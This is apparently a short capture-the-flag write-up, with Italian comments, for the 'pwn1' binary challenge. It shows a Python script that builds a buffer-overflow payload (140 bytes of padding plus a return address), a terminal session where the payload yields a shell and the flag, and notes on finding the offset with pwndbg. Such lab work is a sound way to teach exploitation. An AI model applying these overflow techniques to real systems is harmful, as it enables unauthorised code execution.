@@ -1,0 +1,29 @@
+root@1ef723d1e86a:/app# cat exploit.py
+import sys
+
+# 1. Il buffer e il padding fino a EIP (140 + 4 byte)
+# Usiamo 'A' come riempimento
+padding = b"A" * 140
+
+# 2. L'indirizzo di destinazione in Little-Endian
+# 0x080484ad -> \xad \x84 \x04 \x08
+target_addr = b"\xad\x84\x04\x08"
+
+# 3. Uniamo tutto e scriviamo sul file 'payload'
+payload = padding + target_addr
+
+with open("payload", "wb") as f:
+    f.write(payload)
+
+root@1ef723d1e86a:/app# (cat payload; cat )|./pwn1
+Tell me your name:
+Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+ls
+HINTS  core  exploit.py  flag.txt  payload  pwn1  pwn1.c  pwn1.id0  pwn1.id1  pwn1.id2	pwn1.nam  pwn1.til
+cat flag.txt
+encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
+^C
+Segmentation fault
+
+abbiamo trovato il giusto offset tra s e EIP tramite la creazione di un pattern (cyclic in pwndbg) e l'uso del comando pattern search (cyclic -l in pwndbg),
+abbiamo poi eseguito overflow puntando l'EIP all'indirizzo della nostra shell (che era un funzione cmq già esistente) 
